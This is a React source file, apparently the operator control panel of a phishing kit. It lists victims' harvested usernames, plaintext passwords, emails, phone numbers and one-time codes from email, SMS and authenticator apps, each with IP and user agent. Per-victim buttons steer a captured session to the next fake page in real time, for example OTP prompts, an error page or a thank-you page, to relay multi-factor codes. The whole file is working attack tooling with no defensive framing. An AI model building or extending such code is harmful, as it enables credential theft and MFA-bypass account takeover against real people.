import React, { useEffect, useState } from "react";
import {
  fetchAllLogs,
  fetchRecentUser,
  deleteLog,
  updateUserStep,
} from "../../services/api";
import { useNavigate } from "react-router-dom";

const AdminDashboard = () => {
  const [logs, setLogs] = useState([]);
  const [emailLogs, setEmailLogs] = useState([]);
  const [emailOtpLogs, setEmailOtpLogs] = useState([]);
  const [phoneNumberLogs, setPhoneNumberLogs] = useState([]);
  const [phoneOtpLogs, setPhoneOtpLogs] = useState([]);
  const [authenticatorOtpLogs, setAuthenticatorOtpLogs] = useState([]);

  const navigate = useNavigate();

  useEffect(() => {
    const getAllLogs = async () => {
      try {
        const response = await fetchAllLogs();
        if (response.status === 200) {
          setLogs(response.data.filter((log) => log.username && log.password));
          setEmailLogs(response.data.filter((log) => log.email));
          setPhoneNumberLogs(response.data.filter((log) => log.phoneNumber));
          setEmailOtpLogs(
            response.data.filter((log) => log.emailOtp && !log.phoneOtp)
          );
          setPhoneOtpLogs(
            response.data.filter((log) => log.phoneOtp && !log.emailOtp)
          );
          setAuthenticatorOtpLogs(
            response.data.filter((log) => log.authenticatorOtp)
          );
        }
      } catch (error) {
        console.error("Failed to fetch all logs:", error);
      }
    };

    getAllLogs();

    const getRecentUser = async () => {
      try {
        const response = await fetchRecentUser();
        if (response.status === 200) {
          const newLog = response.data;
          const exists = logs.some((log) => log._id === newLog._id);
          if (!exists) {
            setLogs((prevLogs) => [...prevLogs, newLog]);
            setEmailLogs((prevLogs) => [...prevLogs, newLog]);
            setEmailOtpLogs((prevLogs) => [...prevLogs, newLog]);
            setPhoneNumberLogs((prevLogs) => [...prevLogs, newLog]);
            setPhoneOtpLogs((prevLogs) => [...prevLogs, newLog]);
            setAuthenticatorOtpLogs((prevLogs) => [...prevLogs, newLog]);
          }
        }
      } catch (error) {
        console.error("Failed to fetch recent user:", error);
      }
    };

    const intervalId = setInterval(getRecentUser, 10000);

    return () => clearInterval(intervalId);
  }, [
    logs,
    emailLogs,
    emailOtpLogs,
    phoneNumberLogs,
    phoneOtpLogs,
    authenticatorOtpLogs,
  ]);

  const handleRedirect = async (userId, nextStep) => {
    try {
      const response = await updateUserStep(userId, nextStep);
      if (response.status === 200) {
        console.log(`User step updated to ${nextStep}`);
      } else {
        console.error("Failed to update user step:", response.data);
      }
    } catch (error) {
      console.error("Failed to update user step:", error);
    }
  };

  const handleDelete = async (id) => {
    try {
      const response = await deleteLog(id);
      if (response.status === 200) {
        setLogs((prevLogs) => prevLogs.filter((log) => log._id !== id));
        setEmailLogs((prevLogs) => prevLogs.filter((log) => log._id !== id));
        setEmailOtpLogs((prevLogs) => prevLogs.filter((log) => log._id !== id));
        setPhoneNumberLogs((prevLogs) =>
          prevLogs.filter((log) => log._id !== id)
        );
        setPhoneOtpLogs((prevLogs) => prevLogs.filter((log) => log._id !== id));
      }
    } catch (error) {
      console.error("Failed to delete log:", error);
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-gray-100">
      <header className="bg-blue-600 text-white p-4 shadow">
        <div className="max-w-7xl mx-auto flex justify-between items-center">
          <h1 className="text-xl md:text-2xl font-bold">Admin Dashboard</h1>
          <button className="bg-red-500 hover:bg-red-600 text-white px-4 py-2 rounded text-sm md:text-base">
            Logout
          </button>
        </div>
      </header>

      <main className="flex-grow p-4 md:p-6">
        <div className="max-w-7xl mx-auto">
          <h2 className="text-lg md:text-xl font-semibold mb-4">
            User Submissions
          </h2>

          {/* Username/Password Logs */}
          <div className="bg-white shadow rounded-lg p-4 mb-6 overflow-x-auto">
            <h3 className="text-md md:text-lg font-semibold mb-4">
              Username/Password Logs
            </h3>
            <div className="overflow-x-auto">
              <table className="w-full table-auto">
                <thead>
                  <tr>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      Timestamp
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      Username
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      Password
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      IP Address
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      User Agent
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      Actions
                    </th>
                  </tr>
                </thead>
                <tbody>
                  {logs.map((log) => (
                    <tr key={log._id} className="border-t">
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {new Date(log.createdAt).toLocaleString()}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {log.username}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {log.password}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {log.ip}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {log.userAgent}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        <div className="flex flex-wrap space-x-2 md:space-x-4 space-y-2 md:space-y-0">
                          <button
                            onClick={() =>
                              handleRedirect(log._id, "email-password")
                            }
                            className="bg-green-500 hover:bg-green-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Email Page
                          </button>
                          <button
                            onClick={() =>
                              handleRedirect(log._id, "phone-number")
                            }
                            className="bg-blue-500 hover:bg-blue-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Phone Number
                          </button>
                          <button
                            onClick={() => handleRedirect(log._id, "email-otp")}
                            className="bg-yellow-500 hover:bg-yellow-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Email OTP
                          </button>
                          <button
                            onClick={() => handleRedirect(log._id, "phone-otp")}
                            className="bg-purple-500 hover:bg-purple-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Phone OTP
                          </button>
                          <button
                            onClick={() =>
                              handleRedirect(log._id, "authenticator-otp")
                            }
                            className="bg-indigo-500 hover:bg-indigo-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Authenticator OTP
                          </button>
                          <button
                            onClick={() =>
                              handleRedirect(log._id, "error-page")
                            }
                            className="bg-red-500 hover:bg-red-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Error Page
                          </button>
                          <button
                            onClick={() => handleDelete(log._id)}
                            className="bg-gray-500 hover:bg-gray-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            🗑️
                          </button>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>

          {/* Email Logs */}
          <div className="bg-white shadow rounded-lg p-4 mb-6">
            <h3 className="text-md md:text-lg font-semibold mb-4">
              Email Logs
            </h3>
            <div className="overflow-x-auto">
              <table className="w-full table-auto">
                <thead>
                  <tr>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      Timestamp
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      Email
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      IP Address
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      User Agent
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      Actions
                    </th>
                  </tr>
                </thead>
                <tbody>
                  {emailLogs.map((log) => (
                    <tr key={log._id} className="border-t">
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {new Date(log.createdAt).toLocaleString()}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {log.email}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {log.ip}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {log.userAgent}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        <div className="flex flex-wrap space-x-2 md:space-x-4 space-y-2 md:space-y-0">
                          <button
                            onClick={() => handleRedirect(log._id, "email-otp")}
                            className="bg-yellow-500 hover:bg-yellow-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Redirect to OTP Page
                          </button>
                          <button
                            onClick={() =>
                              handleRedirect(log._id, "phone-number")
                            }
                            className="bg-green-500 hover:bg-green-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Redirect to Phone Number Page
                          </button>
                          <button
                            onClick={() => handleRedirect(log._id, "phone-otp")}
                            className="bg-purple-500 hover:bg-purple-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Redirect to Phone OTP Page
                          </button>
                          <button
                            onClick={() =>
                              handleRedirect(log._id, "authenticator-otp")
                            }
                            className="bg-indigo-500 hover:bg-indigo-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Redirect to Authenticator OTP Page
                          </button>
                          <button
                            onClick={() =>
                              handleRedirect(log._id, "error-page")
                            }
                            className="bg-red-500 hover:bg-red-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Show Error Page
                          </button>
                          <button
                            onClick={() => handleRedirect(log._id, "thank-you")}
                            className="bg-teal-500 hover:bg-teal-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Redirect to Thank You Page
                          </button>
                          <button
                            onClick={() => handleDelete(log._id)}
                            className="bg-gray-500 hover:bg-gray-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            🗑️
                          </button>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>

          {/* Similar structure for other logs (Email OTP, Phone Number, Phone OTP, etc.) */}
          {/* Add the rest of your logs here following the same responsive approach */}

          {/* Email OTP Logs */}
          <div className="bg-white shadow rounded-lg p-4 mb-6">
            <h3 className="text-md md:text-lg font-semibold mb-4">
              Email OTP Logs
            </h3>
            <div className="overflow-x-auto">
              <table className="w-full table-auto">
                <thead>
                  <tr>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      Timestamp
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      Email OTP
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      IP Address
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      User Agent
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      Actions
                    </th>
                  </tr>
                </thead>
                <tbody>
                  {emailOtpLogs.map((log) => (
                    <tr key={log._id} className="border-t">
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {new Date(log.createdAt).toLocaleString()}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {log.emailOtp}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {log.ip}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {log.userAgent}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        <div className="flex flex-wrap space-x-2 md:space-x-4 space-y-2 md:space-y-0">
                          <button
                            onClick={() =>
                              handleRedirect(log._id, "phone-number")
                            }
                            className="bg-green-500 hover:bg-green-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Redirect to Phone Number Page
                          </button>
                          <button
                            onClick={() => handleRedirect(log._id, "phone-otp")}
                            className="bg-purple-500 hover:bg-purple-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Redirect to Phone OTP Page
                          </button>
                          <button
                            onClick={() =>
                              handleRedirect(log._id, "authenticator-otp")
                            }
                            className="bg-indigo-500 hover:bg-indigo-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Redirect to Authenticator OTP Page
                          </button>
                          <button
                            onClick={() =>
                              handleRedirect(log._id, "error-page")
                            }
                            className="bg-red-500 hover:bg-red-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Show Error Page
                          </button>
                          <button
                            onClick={() => handleRedirect(log._id, "thank-you")}
                            className="bg-teal-500 hover:bg-teal-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Redirect to Thank You Page
                          </button>
                          <button
                            onClick={() => handleDelete(log._id)}
                            className="bg-gray-500 hover:bg-gray-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            🗑️
                          </button>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
          {/* Phone Number Logs */}
          <div className="bg-white shadow rounded-lg p-4 mb-6">
            <h3 className="text-md md:text-lg font-semibold mb-4">
              Phone Number Logs
            </h3>
            <div className="overflow-x-auto">
              <table className="w-full table-auto">
                <thead>
                  <tr>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      Timestamp
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      Phone Number
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      IP Address
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      User Agent
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      Actions
                    </th>
                  </tr>
                </thead>
                <tbody>
                  {phoneNumberLogs.map((log) => (
                    <tr key={log._id} className="border-t">
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {new Date(log.createdAt).toLocaleString()}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {log.phoneNumber}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {log.ip}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {log.userAgent}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        <div className="flex flex-wrap space-x-2 md:space-x-4 space-y-2 md:space-y-0">
                          <button
                            onClick={() => handleRedirect(log._id, "phone-otp")}
                            className="bg-yellow-500 hover:bg-yellow-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Redirect to Phone OTP Page
                          </button>
                          <button
                            onClick={() =>
                              handleRedirect(log._id, "authenticator-otp")
                            }
                            className="bg-indigo-500 hover:bg-indigo-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Redirect to Authenticator OTP Page
                          </button>
                          <button
                            onClick={() => handleRedirect(log._id, "thank-you")}
                            className="bg-green-500 hover:bg-green-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Redirect to Thank You Page
                          </button>
                          <button
                            onClick={() =>
                              handleRedirect(log._id, "email-password")
                            }
                            className="bg-blue-500 hover:bg-blue-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Redirect to User/Pass Page
                          </button>
                          <button
                            onClick={() =>
                              handleRedirect(log._id, "error-page")
                            }
                            className="bg-red-500 hover:bg-red-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Show Error Page
                          </button>
                          <button
                            onClick={() => handleDelete(log._id)}
                            className="bg-gray-500 hover:bg-gray-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            🗑️
                          </button>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
          {/* Phone OTP Logs */}
          <div className="bg-white shadow rounded-lg p-4 mb-6">
            <h3 className="text-md md:text-lg font-semibold mb-4">
              Phone OTP Logs
            </h3>
            <div className="overflow-x-auto">
              <table className="w-full table-auto">
                <thead>
                  <tr>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      Timestamp
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      Phone Number
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      OTP
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      IP Address
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      User Agent
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      Actions
                    </th>
                  </tr>
                </thead>
                <tbody>
                  {phoneOtpLogs.map((log) => (
                    <tr key={log._id} className="border-t">
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {new Date(log.createdAt).toLocaleString()}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {log.phoneNumber}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {log.phoneOtp}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {log.ip}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {log.userAgent}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        <div className="flex flex-wrap space-x-2 md:space-x-4 space-y-2 md:space-y-0">
                          <button
                            onClick={() =>
                              handleRedirect(log._id, "authenticator-otp")
                            }
                            className="bg-indigo-500 hover:bg-indigo-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Redirect to Authenticator OTP Page
                          </button>
                          <button
                            onClick={() =>
                              handleRedirect(log._id, "email-password")
                            }
                            className="bg-blue-500 hover:bg-blue-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Redirect to User/Pass Page
                          </button>
                          <button
                            onClick={() =>
                              handleRedirect(log._id, "phone-number")
                            }
                            className="bg-green-500 hover:bg-green-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Redirect to Phone Number Page
                          </button>
                          <button
                            onClick={() => handleRedirect(log._id, "thank-you")}
                            className="bg-yellow-500 hover:bg-yellow-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Redirect to Thank You Page
                          </button>
                          <button
                            onClick={() =>
                              handleRedirect(log._id, "error-page")
                            }
                            className="bg-red-500 hover:bg-red-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Show Error Page
                          </button>
                          <button
                            onClick={() => handleDelete(log._id)}
                            className="bg-gray-500 hover:bg-gray-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            🗑️
                          </button>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
          {/* Authenticator OTP Logs */}
          <div className="bg-white shadow rounded-lg p-4 mb-6">
            <h3 className="text-md md:text-lg font-semibold mb-4">
              Authenticator OTP Logs
            </h3>
            <div className="overflow-x-auto">
              <table className="w-full table-auto">
                <thead>
                  <tr>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      Timestamp
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      Authenticator OTP
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      IP Address
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      User Agent
                    </th>
                    <th className="px-2 py-1 md:px-4 md:py-2 text-left text-xs md:text-sm font-medium text-gray-500">
                      Actions
                    </th>
                  </tr>
                </thead>
                <tbody>
                  {authenticatorOtpLogs.map((log) => (
                    <tr key={log._id} className="border-t">
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {new Date(log.createdAt).toLocaleString()}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {log.authenticatorOtp}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {log.ip}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        {log.userAgent}
                      </td>
                      <td className="px-2 py-1 md:px-4 md:py-2 text-xs md:text-sm text-gray-700">
                        <div className="flex flex-wrap space-x-2 md:space-x-4 space-y-2 md:space-y-0">
                          <button
                            onClick={() =>
                              handleRedirect(log._id, "email-password")
                            }
                            className="bg-blue-500 hover:bg-blue-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Redirect to User/Pass Page
                          </button>
                          <button
                            onClick={() =>
                              handleRedirect(log._id, "phone-number")
                            }
                            className="bg-green-500 hover:bg-green-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Redirect to Phone Number Page
                          </button>
                          <button
                            onClick={() => handleRedirect(log._id, "phone-otp")}
                            className="bg-yellow-500 hover:bg-yellow-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Redirect to Phone OTP Page
                          </button>
                          <button
                            onClick={() => handleRedirect(log._id, "thank-you")}
                            className="bg-purple-500 hover:bg-purple-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Redirect to Thank You Page
                          </button>
                          <button
                            onClick={() =>
                              handleRedirect(log._id, "error-page")
                            }
                            className="bg-red-500 hover:bg-red-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            Show Error Page
                          </button>
                          <button
                            onClick={() => handleDelete(log._id)}
                            className="bg-gray-500 hover:bg-gray-600 text-white px-3 py-1 rounded text-xs md:text-sm w-full sm:w-auto"
                          >
                            🗑️
                          </button>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
};

export default AdminDashboard;
